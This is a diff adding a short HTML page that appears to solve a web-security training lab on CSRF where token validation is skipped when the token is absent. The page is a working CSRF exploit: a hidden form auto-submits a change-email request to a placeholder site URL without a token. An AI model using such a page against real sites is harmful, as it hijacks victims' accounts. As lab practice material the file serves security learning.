@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>
+            Lab: CSRF where token validation depends on token being present
+        </title>
+    </head>
+    <body>
+        <form action="https://WEBSITE-URL/my-account/change-email" method="post" id="form-exploit">
+            <input type="text" name="email" value="abcd@normal-user.net">
+            <input type="submit">
+        </form>
+    </body>
+    <script>
+        document.getElementById('form-exploit').submit()
+    </script>
+</html>
